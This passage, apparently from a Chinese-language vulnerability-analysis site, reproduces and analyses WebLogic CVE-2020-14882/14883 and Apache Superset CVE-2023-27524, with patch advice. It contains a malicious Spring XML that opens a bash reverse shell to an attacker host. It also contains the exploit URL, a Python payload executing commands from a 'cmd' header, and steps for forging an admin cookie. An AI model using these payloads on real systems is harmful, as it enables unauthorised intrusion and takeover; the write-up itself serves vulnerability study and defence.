7777\n</code></pre> <p>\u4e8b\u5148\u51c6\u5907\u4e00\u53f0web\u670d\u52a1\u5668\uff0c\u653e\u7f6e\u6076\u610frce.xml\u6587\u4ef6</p> <p>rce.xml\u4e2d\u7684\u6267\u884c\u547d\u4ee4\u5982\u4e0b\u793a\u4f8b\uff1a</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n   xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt;\n    &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt;\n        &lt;constructor-arg&gt;\n          &lt;list&gt;\n            &lt;value&gt;bash&lt;/value&gt;\n            &lt;value&gt;-c&lt;/value&gt;\n            &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.31.66/7777 0&gt;&amp;1]]&gt;&lt;/value&gt;\n          &lt;/list&gt;\n        &lt;/constructor-arg&gt;\n    &lt;/bean&gt;\n&lt;/beans&gt;\n</code></pre> <p>\u7136\u540e\u901a\u8fc7\u5982\u4e0bURL\uff0c\u5373\u53ef\u8ba9Weblogic\u52a0\u8f7d\u8fd9\u4e2aXML\uff0c\u5e76\u6267\u884c\u5176\u4e2d\u7684\u547d\u4ee4\uff1a</p> <pre><code>http://ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://192.168.31.66/rce.xml\")\n</code></pre> <p>\u5728\u653b\u51fb\u8005\u4e3b\u673a\u4e0a\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39\u7684shell</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#poc","title":"\u6f0f\u6d1e\u68c0\u6d4bpoc","text":"<p>WebLogic-CVE-2020-14882\uff1a</p> <pre><code>import requests\n\ndef scan(target_url):\n    try:\n        headers = {\n            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36'\n        }\n        # \u6f0f\u6d1e\u5229\u7528\u7684URL\u8def\u5f84\n        vulnerable_path = \"/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29\"\n        # \u5b8c\u6574\u7684URL\n        vul_url = target_url + vulnerable_path\n        response = requests.get(vul_url, headers=headers, timeout=10)\n        # \u68c0\u67e5\u54cd\u5e94\u72b6\u6001\u7801\u662f\u5426\u4e3a200 OK\n        if response.status_code == 200:\n            # \u68c0\u67e5\u54cd\u5e94\u5185\u5bb9\u4e2d\u662f\u5426\u5305\u542b\u7279\u5b9a\u7684\u9875\u9762\u6807\u8bc6\n             if \"WebLogic Server\" in response.text:\n                return True\n        return False\n    except Exception as e:\n        print(f\"[-] \u53d1\u751f\u9519\u8bef: {e}\")\n        return False\n</code></pre> <p>WebLogic-CVE-2020-14883\uff1a</p> <pre><code>import http.client\nimport requests\nimport sys\nimport argparse\nhttp.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'\n\npayload_cve_2020_14882_v12 = ('_nfpb=true&amp;_pageLabel=&amp;handle='\n            'com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread = '\n            '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '\n            'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'\n            '(\"connectionHandler\"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'\n            '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '\n            'obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"cmd\"); '\n            'String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]'\n            '{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd}; if (cmd != null) { String result '\n            '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'\n            '(\"\\\\\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'\n            'ServletResponseImpl) req.getClass().getMethod(\"getResponse\").invoke(req);'\n            'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'\n            'res.getServletOutputStream().flush(); res.getWriter().write(\"\"); }executeThread.interrupt(); \");')\n\ndef scan(target_url):\n\n    payload = payload_cve_2020_14882_v12\n    # \u6f0f\u6d1e\u5229\u7528\u7684URL\u8def\u5f84\n    path = \"/console/css/%252e%252e%252fconsole.portal\"\n    # \u6784\u5efapayload\n    headers = {\n            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',\n            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'\n                      'application/signed-exchange;v=b3;q=0.9',\n            'Accept-Encoding': 'gzip, deflate',\n            'Accept-Language': 'zh-CN,zh;q=0.9',\n            'Connection': 'close',\n            'Content-Type': 'application/x-www-form-urlencoded',\n            'cmd': 'whoami'\n        }\n    try:\n        # \u5b8c\u6574\u7684URL\n        request = requests.post(target_url + path, data=payload, headers=headers, timeout=10, verify=False)        # \u68c0\u67e5\u54cd\u5e94\u5185\u5bb9\u4e2d\u662f\u5426\u5305\u542b\u7279\u5b9a\u7684\u7cfb\u7edf\u4fe1\u606f\n        # print(request.text)\n        expected_output = \"oracle\"\n        if expected_output in request.text:\n            return True\n        return False\n    except Exception as e:\n        print(f\"[-] \u53d1\u751f\u9519\u8bef: {e}\")\n        return False\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u6765\u68c0\u6d4b\u6f0f\u6d1e\u662f\u5426\u5b58\u5728:https://github.com/hypnoticp/Python_script</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_6","title":"\u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae","text":"<p>\u6b64\u6b21 Oracle \u5b98\u65b9\u7684 CPU\u5df2\u53d1\u5e03\u4e86\u9488\u5bf9\u8be5\u6f0f\u6d1e\u7684\u8865\u4e01\uff0c\u8bf7\u53d7\u5f71\u54cd\u7528\u6237\u53ca\u65f6\u4e0b\u8f7d\u8865\u4e01\u7a0b\u5e8f\u5e76\u5b89\u88c5\u66f4\u65b0\u3002</p> <p>\u53ca\u65f6\u66f4\u65b0\u8865\u4e01\uff0c\u53c2\u8003oracle\u5b98\u7f51\u53d1\u5e03\u7684\u8865\u4e01:</p> <p>Oracle Critical Patch Update Advisory - October 2020</p> <p>https://www.oracle.com/security-alerts/cpuoct2020traditional.html</p> <p>\u6ce8\uff1aOracle\u5b98\u65b9\u8865\u4e01\u9700\u8981\u7528\u6237\u6301\u6709\u6b63\u7248\u8f6f\u4ef6\u7684\u8bb8\u53ef\u8d26\u53f7\uff0c\u4f7f\u7528\u8be5\u8d26\u53f7\u767b\u9646https://support.oracle.com\u540e\uff0c\u53ef\u4ee5\u4e0b\u8f7d\u6700\u65b0\u8865\u4e01\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_7","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>\u539f\u7406\u5927\u6982\u662f\u7ed5\u8fc7\u6743\u9650\u8bbf\u95ee\u5230console.portal\u8def\u5f84\u5e76\u4e14\u89e6\u53d1handle\u6267\u884c\uff0cCVE-2020-14883 \u662f\u4e00\u4e2a Console \u7684\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u800c CVE-2020-14883 \u662f\u5728\u5229\u7528\u672a\u6388\u6743\u8bbf\u95ee\u7684\u524d\u63d0\u4e0b\uff0c\u5728 Console \u8fdb\u884c\u4ee3\u7801\u6267\u884c\uff0c\u4e8e\u662f\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u7684 HTTP \u8bf7\u6c42\uff0c\u5728\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u63a5\u7ba1 WebLogic Server Console \uff0c\u5e76\u5728 WebLogic Server Console \u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#cve-2020-14882","title":"CVE-2020-14882\u5206\u6790","text":""},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_8","title":"\u6f0f\u6d1e\u89e6\u53d1\u70b9\uff1a","text":"<p>\u9996\u5148\u8981\u660e\u767d\uff0c\u6f0f\u6d1e\u7684\u89e6\u53d1\u662f\u5728 console \u7ec4\u4ef6\uff0c\u800cconsole\u5bf9\u5e94\u7740webapp\u670d\u52a1\uff0c\u8def\u5f84\uff1awlserver/server/lib/consoleapp/webapp\u3002\u5e76\u4e14\u5b58\u5728web.xml\uff0c\u4e8e\u662f\u67e5\u770b\u4e0eMBeanUtilsInitSingleFileServlet\u76f8\u5173\u7684web.xml\u4fe1\u606f\uff1a</p> <p>\u5728web.xml\u4e2d\uff0cAppManagerServlet\u662f\u4e00\u4e2a\u5173\u952e\u7684servlet\uff0c\u5b83\u901a\u8fc7init-param\u6307\u5b9a\u4e86MBeanUtilsInitSingleFileServlet\u4f5c\u4e3a\u5176servlet-class-name\u7684\u521d\u59cb\u5316\u503c\u3002\u8fd9\u4e2aservlet\u8d1f\u8d23\u5904\u7406\u5bf9*.portal\u8def\u5f84\u7684\u8bf7\u6c42\u3002</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_9","title":"\u8bf7\u6c42\u5904\u7406\uff1a","text":"<p>\u5f53\u7528\u6237\u8bf7\u6c42/console/console.portal\u65f6\uff0c\u8bf7\u6c42\u4f1a\u7ecf\u8fc7AppManagerServlet\u7684\u5206\u6d3e\u5904\u7406\u3002\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u4f1a\u901a\u8fc7ServletRequestImpl\u7684\u9884\u5904\u7406\uff0c\u8c03\u7528WebAppSecurity#checkAccess\u8fdb\u884c\u6743\u9650\u6821\u9a8c\u3002</p> <p>\u4ece\u7ed5\u8fc7\u8def\u5f84\u6743\u9650\u7684\u6821\u9a8c\u5f00\u59cb\u3002\u9996\u5148weblogic\u7684\u8bf7\u6c42\u4f1a\u7ecf\u8fc7weblogic.servlet.internal.WebAppServletContext#execute\u5904\u7406\uff0c\u8fd9\u91cc\u4f1a\u8c03\u7528securedExecute()</p> <p></p> <p>\u8ddf\u8fdbsecuredExecute\uff0c\u540e\u4f1a\u8c03\u7528doSecuredExecute\uff0c\u7ee7\u7eed\u8ddf\u8fdb</p> <p></p> <p>weblogic.servlet.internal.WebAppServletContext#doSecuredExecute</p> <p></p> <p>\u8fdb\u5165weblogic.servlet.security.internal.WebAppSecurity#checkAccess()\u4e2d\u53ef\u4ee5\u770b\u5230\u5f53\u6211\u4eec\u8bf7\u6c42\u7684\u8def\u5f84\u4e3a/console/console.portal\u65f6\uff0ccheckAllResources\u4e3afalse</p> <p></p> <p>\u8fd9\u91cc\u8ddf\u8fdbweblogic.servlet.security.internal.WebAppSecurityWLS#getConstraint()</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_10","title":"\u9759\u6001\u8d44\u6e90\u4e0e\u6743\u9650\u6821\u9a8c\uff1a","text":"<p>\u5982\u679c\u8bf7\u6c42\u7684\u8d44\u6e90\u5728matchMap\u4e2d\uff0c\u5219\u88ab\u89c6\u4e3a\u9759\u6001\u8d44\u6e90\uff0c\u4e0d\u4f1a\u8fdb\u884c\u6743\u9650\u9a8c\u8bc1\u3002\u5982\u679c\u4e0d\u5728matchMap\u4e2d\uff0c\u5219\u4f1a\u8c03\u7528SecurityModule#isAuthorized\u8fdb\u884c\u6743\u9650\u6821\u9a8c\u3002\u5982\u679c\u6821\u9a8c\u5931\u8d25\uff0c\u8bf7\u6c42\u4f1a\u88ab\u91cd\u5b9a\u5411\u5230\u767b\u5f55\u754c\u9762\u3002</p> <p>\u8fd9\u91cc\u5373\u6bd4\u8f83\u6211\u4eec\u7684relURI\u662f\u5426\u5339\u914d\u6211\u4eecmatchMap\u4e2d\u7684\u8def\u5f84\uff0c\u5e76\u5224\u65adrcForAllMethods\u548crcForOneMethod\u662f\u5426\u4e3anull</p> <p>\u5f53\u6211\u4eec\u7684relURI\u4e3a/console.portal\u65f6\uff0crcForAllMethods\u4e0d\u4e3anull\uff0crcForOneMethod\u4e3anull\uff0c\u6240\u4ee5\u8fd4\u56de\u4e86rcForAllMethods\u3002\u800c\u5bf9\u5e94\u9759\u6001\u8d44\u6e90\u5c31\u4e0d\u4f1a\u6709\u9650\u5236\u548c\u6821\u9a8c</p> <p></p> <p>\u63a5\u4e0b\u6765\u56de\u5230checkAccess\uff0c\u5982\u679c\u8fd9\u91cc\u662f\u539f\u6765\u7684/console.portal\u65f6\uff0c\u5230\u8fd9\u5c31\u7ed3\u675f\u4e86</p> <p></p> <p>\u5982\u679c\u4f7f\u7528console/images/console.portal\u5219\u4f1a\u7ee7\u7eed\u5224\u65adresourceConstraint\u53ca\u540e\u7eed\u7684isAuthorized\uff0c\u5e76\u8fdb\u5165weblogic.servlet.security.internal.ChainedSecurityModule#checkAccess</p> <p></p> <p>\u5728weblogic.servlet.security.internal.CertSecurityModule#checkUserPerm\u4e2d\u4f1a\u8fdb\u5165hasPermission\u6821\u9a8c\u6743\u9650</p> <p></p> <p>\u6240\u4ee5\u5f53\u6211\u4eec\u8fd9\u91cc\u4f7f\u7528\u9759\u6001\u8d44\u6e90\u8def\u5f84\u65f6\uff0cunrestrict\u503c\u5c31\u4e3atrue</p> <p></p> <p>\u7136\u540e checkAcess\u65b9\u6cd5\u8fd4\u56de true\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_11","title":"\u91cd\u5b9a\u5411\u767b\u9646\u754c\u9762","text":"<p>\u5982\u679ccheckAcess\u65b9\u6cd5\u8fd4\u56defalse\u3002\u90a3\u4e48\u4e0d\u4f1a\u8fdb\u5165\u540e\u7eed\u7684\u5206\u6d3e\uff0c\u4f1a\u7ed3\u675fdoSecuredExecute\u65b9\u6cd5\u7684\u6267\u884c\u3002\u4e00\u8defreturn\u5230\u6267\u884cServletRequestImpl#runInternal\u7684finally\u5206\u652f\u3002</p> <p></p> <p>\u8fd9\u91cc\u4f1a\u8c03\u7528send\u65b9\u6cd5\uff0c\u5728\u8be5\u65b9\u6cd5\u4f1a\u5c06\u6ca1\u6709\u5206\u6d3e\u7684\u8bf7\u6c42\u91cd\u5b9a\u5411\u5230login\u754c\u9762\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_12","title":"\u8bf7\u6c42\u5206\u6d3e\uff1a","text":"<p>\u5982\u679ccheckAcess\u65b9\u6cd5\u8fd4\u56detrue,\u8bf7\u6c42\u4f1a\u7ee7\u7eed\u5206\u6d3e\uff0c\u6700\u7ec8\u8c03\u7528ServletStubImpl\u7684execute\u65b9\u6cd5\u3002\u6839\u636eweb.xml\u7684\u914d\u7f6e\uff0c\u8bf7\u6c42\u4f1a\u8c03\u7528\u5bf9\u5e94\u7684Servlet\u3002</p> <p>\u6ce8\u610f\uff0c\u6839\u636eweb.xml\uff0c\u8bf7\u6c42\u5982\u4e0b\u8def\u5f84\u6240\u5bf9\u5e94\u7684servlet\u4e0d\u4e00\u6837\uff0c\u56e0\u4e3a\u51e0\u4e2a\u8def\u5f84\u90fd\u662f\u4e4b\u524d\u6240\u63d0\u5230\u7684\u9759\u6001\u8def\u5f84\uff0c\u6ca1\u6709\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4f46\u662f\u6211\u4eec\u9700\u8981\u5229\u7528\u5230AsyncInitServlet\u6765\u5904\u7406\uff0c\u56e0\u4e3a\u6211\u4eecdiff\u5230\u7684\u4fee\u8865\u70b9\u5728MBeanUtilsInitSingleFileServlet\uff0c\u8fd9\u4e2a\u7c7b\u662f\u901a\u8fc7AsyncInitServlet\u6765\u8bbe\u7f6e\u7684\u3002</p> <p>servlet\u5bf9\u5e94\u5173\u7cfb\u90e8\u5206\u5982\u4e0b\uff1a</p> <pre><code>/framework/skeletons/wlsconsole/js/* -&gt; FileDefault\n/css/* -&gt; AsyncInitServlet\n/images/* -&gt; AsyncInitServlet\n/common/* -&gt; JSPCServlet\n...\n</code></pre> <p>\u4e8e\u662f\uff0c\u8bf7\u6c42/css/*\u4f1a\u8c03\u7528AsyncInitServlet\u7684service\u65b9\u6cd5\uff0c\u4e4b\u540e\u4f1a\u6839\u636eweb.xml\u4e2d\u7684\u914d\u7f6e\u5bf9\u5e94\u7684AsyncInitServlet\u6765\u5230\u4e86weblogic.servlet.AsyncInitServlet#service</p> <p></p> <p>\u8fd9\u91cc\u7684delegate\u5c31\u662f\u5728web.xml\u88ab\u521d\u59cb\u5316\u7684MBeanUtilsInitSingleFileServlet\u3002 \u63a5\u4e0b\u6765\u4ee5\u6f0f\u6d1eURL\u4e3a\u4f8b\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_13","title":"\u76ee\u5f55\u7a7f\u8d8a\uff1a","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u7279\u5b9a\u7684\u8bf7\u6c42\u8def\u5f84\uff08\u5982/css/%252E%252E%252Fconsole.portal\uff09\uff0c\u5229\u7528\u76ee\u5f55\u7a7f\u8d8a\u6280\u5de7\u8bbf\u95eeconsole.portal\u6587\u4ef6\u3002\u8fd9\u91cc\u7684%252E%252E\u662f..\u7684URL\u7f16\u7801\u5f62\u5f0f\u3002</p> <pre><code>/css/%252E%252E%252Fconsole.portal\n</code></pre> <p>\u8fd9\u91cc\u8981\u4e8c\u6b21\u7f16\u7801\u7684\u539f\u56e0\u662f\uff0c\u53d1\u8fc7\u53bb\u7684\u65f6\u5019http\u4f1a\u89e3\u4e00\u6b21\u7801\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u4f20\u7684\u662f/css/%2E%2E%2Fconsole.portal\uff0c\u90a3\u4e48\u89e3\u7801\u540e\u5c31\u662f/css/../console.portal\uff0c\u8fd9\u6837\u53d1\u5230\u670d\u52a1\u7aef\u5c31\u6ca1\u529e\u6cd5\u5339\u914d\u5230\u9759\u6001\u8d44\u6e90\u4e86\uff0c\u76f4\u63a5\u5904\u7406\u6210\u4e86/console.portal\u3002</p> <p>\u5982\u679chttp\u89e3\u7801\u540e\u7684url\u91cc\u6ca1\u6709;\uff0c\u90a3\u4e48\u5c31\u4f1a\u7ee7\u7eed\u8c03\u7528super.service\uff0c\u800c\u5b98\u65b9\u7684\u8865\u4e01\u4fee\u590d\u4e5f\u662f\u5728\u8fd9\uff0c\u901a\u8fc7\u4e00\u4e2a\u9ed1\u540d\u5355\u5217\u8868\u68c0\u6d4b\u8def\u5f84\u91cc\u7684\u975e\u6cd5\u5b57\u7b26\uff0c\u4e0d\u8fc7\u5b98\u65b9\u7ed9\u51fa\u7684\u9ed1\u540d\u5355\u5b57\u7b26\u4e0d\u591f\u5b8c\u5584\uff0c\u80fd\u591f\u88ab\u7ed5\u8fc7\u3002</p> <p></p> <p>\u518d\u6b21\u8fdb\u5165super.service()</p> <p></p> <p>\u6700\u7ec8\u4e0d\u7ba1\u54ea\u79cd\u8bf7\u6c42\u90fd\u4f1a\u6765\u5230doPost\uff0c\u5e76\u5728\u8fd9\u91cc\u8c03\u7528createUIContext</p> <p></p> <p>UIContext\u4f1a\u6839\u636e\u8bf7\u6c42\u4e2d\u7684\u53c2\u6570\u4f5c\u5bf9\u5e94\u5c5e\u6027\u503c\u7684\u8bbe\u7f6e\uff0c\u6bd4\u5982\u540e\u9762\u4f1a\u8bf4\u5230\u7684_nfpb\u3002</p> <p></p> <p>\u521b\u5efa\u5b8c\u4e4b\u540e\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2aUIContext\u5bf9\u8c61\u3002 \u8fd9\u91cc\u7684tree\u4e5f\u5c31\u662fcreateUIContext\u4f20\u5165\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u521d\u59cb\u503c\u4e3anull\u3002</p> <p></p> <p>\u968f\u540e\u8fdb\u5165getTree\u53c8\u8fdb\u884c\u4e86\u4e00\u6b21\u89e3\u7801\uff0c\u6b64\u65f6requestPattern\u5c31\u53d8\u6210/css/../console.portal</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-2/CVE2.html#_14","title":"\u751f\u547d\u5468\u671f\u8fd0\u884c\uff1a","text":"<p>\u4e00\u65e6console.portal\u6587\u4ef6\u88ab\u52a0\u8f7d\uff0c\u5b83\u4f1a\u521b\u5efa\u4e00\u4e2a\u63a7\u4ef6\u6811\uff0c\u5e76\u5f00\u59cb\u8fd0\u884c\u751f\u547d\u5468\u671f\u65b9\u6cd5\u3002\u8fd9\u4e9b\u65b9\u6cd5\u4f1a\u6839\u636econsole.portal\u6587\u4ef6\u4e2d\u7684XML\u7ed3\u6784\u987a\u5e8f\u6267\u884c\u3002</p> <p>\u8fd9\u4e2a\u987a\u5e8f\u4e5f\u5c31\u662fconsole.portal\u6587\u4ef6\u91cc\u7684xml\u5d4c\u5957\u987a\u5e8f\u3002</p> <p></p> <p>\u56e0\u4e3a\u662f\u6df1\u5ea6\u4f18\u5148\uff0c\u5728console.portal\u91cc\u7684\u6240\u6709\u5f15\u7528\u7684portal\u6587\u4ef6\u4e5f\u4f1a\u6309\u987a\u5e8f\u89e3\u6790\uff0c\u6bd4\u5982</p> <p></p> <p>\u76f4\u5230\u6240\u6709\u6807\u7b7e\u89e3\u6790\u5b8c\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html","title":"Apache Superser\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e(CVE-2023-27524)\u590d\u73b0\u4e0e\u5206\u6790","text":""},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_1","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Apache Superset \u662f\u4e00\u79cd\u5e7f\u6cdb\u4f7f\u7528\u7684\u6570\u636e\u53ef\u89c6\u5316\u548c\u63a2\u7d22\u5f00\u6e90\u5de5\u5177\uff0c\u5df2\u88ab\u786e\u5b9a\u5b58\u5728\u6f5c\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u80fd\u5bfc\u81f4\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7\u548c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c (RCE)\uff0c\u8fd9\u4e9b\u6f0f\u6d1e\u53ef\u80fd\u4f7f\u6076\u610f\u884c\u4e3a\u8005\u80fd\u591f\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u7684\u7ba1\u7406\u6743\u9650\uff0c\u4ece\u800c\u4f7f\u4ed6\u4eec\u80fd\u591f\u6536\u96c6\u7528\u6237\u51ed\u636e\u5e76\u53ef\u80fd\u5371\u53ca\u6570\u636e\u3002</p>"},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Apache Superset 2.0.1 \u7248\u672c\u53ca\u4e4b\u524d\u7248\u672c</p>"},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_3","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_4","title":"\u8d44\u4ea7\u6536\u96c6","text":"<p>\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\uff08FOFA\uff0czoomeye\uff0c\u9e70\u56fe\uff09</p> <pre><code>FOFA\uff1a\" Apache Superset\"\n</code></pre> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_5","title":"\u6f0f\u6d1e\u6d4b\u8bd5","text":"<p>\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u4e0b\u8f7d\uff1ahttps://github.com/horizon3ai/CVE-2023-27524</p> <p></p> <p>\u4e0b\u8f7d\u8be5\u8f6f\u4ef6\uff1a\u7136\u540e\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c-u \u540e\u9762\u8ddf\u4f60\u60f3\u8981\u68c0\u6d4b\u7684\u5730\u5740\u3002</p> <p>\u672c\u5730\u6267\u884c </p> <pre><code>pip3 install -r requirements.txt\n</code></pre> <p>\u547d\u4ee4\uff1a</p> <pre><code>python3 CVE-2023-27524.py -u https://X.X.X.X/ --validate\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u540e\uff0c\u82e5\u5b58\u5728\u6f0f\u6d1e\u5219\u4f1a\u7206\u51fa\u4e00\u4e2acookie\u503c</p> <p></p> <p>\u7136\u540e\u8bbf\u95ee\u6f0f\u6d1eURL\u5730\u5740\uff0cBurp\u62e6\u622a\u6570\u636e\u5305\uff0c\u66ff\u6362\u4e0a\u9762\u7684cookie\u503c\uff0c\u7136\u540e\u653e\u5305</p> <p></p> <p>\u6210\u529f\u767b\u5f55\u8fdb\u53bbApache Superset \u7ba1\u7406\u540e\u53f0 \uff0c\u91cc\u9762\u53ef\u4ee5\u6267\u884c\u4e00\u4e9bsql\u8bed\u53e5\u7b49\u64cd\u4f5c(\u8bc1\u660e\u6709\u5371\u5bb3\u5373\u53ef\uff0c\u4e0d\u8981\u968f\u610f\u6267\u884csql\u8bed\u53e5\u7be1\u6539\u6570\u636e)</p> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_6","title":"\u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u6765\u68c0\u6d4b\u6f0f\u6d1e\u662f\u5426\u5b58\u5728:</p> <pre><code>https://github.com/hypnoticp/Python_script\n</code></pre> <p></p>"},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_7","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\u4fee\u6539\u914d\u7f6e\u4e2d\u7684SECRET_KEY\u503c\uff0c\u4f7f\u7528\u65b0\u7684 SECRET_KEY \u91cd\u65b0\u52a0\u5bc6\u8be5\u4fe1\u606f\uff0c\u53c2\u8003\u94fe\u63a5\uff1ahttps://superset.apache.org/docs/installation/configuring-superset/#secret_key-rotation</p> <p>\u62d2\u7edd\u5728\u975e\u8c03\u8bd5\u73af\u5883\u4e2d\u4f7f\u7528\u9ed8\u8ba4\u5bc6\u7801\u542f\u52a8</p> <p></p> <p></p> <p>\u5b89\u88c5\u5b98\u65b9\u53d1\u5e03\u7684\u5347\u7ea7\u4fee\u590d\u8865\u4e01https://lists.apache.org/thread/n0ftx60sllf527j7g11kmt24wvof8xyk</p>"},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_8","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>Apache Superset\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u6570\u636e\u53ef\u89c6\u5316\u548c\u6570\u636e\u63a2\u6d4b\u5e73\u53f0\uff0c\u5b83\u57fa\u4e8ePython\u6784\u5efa\uff0c\u4f7f\u7528\u4e86\u4e00\u4e9b\u7c7b\u4f3c\u4e8eDjango\u548cFlask\u7684Python web\u6846\u67b6\u3002\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u6237\u53cb\u597d\u7684\u754c\u9762\uff0c\u53ef\u4ee5\u8f7b\u677e\u5730\u521b\u5efa\u548c\u5171\u4eab\u4eea\u8868\u677f\u3001\u67e5\u8be2\u548c\u53ef\u89c6\u5316\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u96c6\u6210\u5230\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u4e2d\u3002</p> <p>\u7531\u4e8e\u7528\u6237\u5728\u9ed8\u8ba4\u5b89\u88c5\u8fc7\u7a0b\u4e2d\uff0c\u672a\u5bf9SECRET_KEY\u7684\u9ed8\u8ba4\u503c\u8fdb\u884c\u66f4\u6539\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7\u4f2a\u9020\u7ba1\u7406\u5458\u8eab\u4efd\u8fdb\u884c\u8bbf\u95ee\u540e\u53f0\uff0c\u5e76\u901a\u8fc7\u540e\u53f0\u539f\u672c\u6570\u636e\u5e93\u6267\u884c\u529f\u80fd\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u64cd\u4f5c\u3002\u200d</p>"},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_9","title":"\u5206\u6790","text":""},{"location":"Vulnerability_analysis/CVE/CVE-3/CVE3.html#_10","title":"\u6f0f\u6d1e\u4fee\u590d\u8865\u4e01","text":"<pre><code>https://github.com/apache/superset/pull/23186/files\n</code></pre> 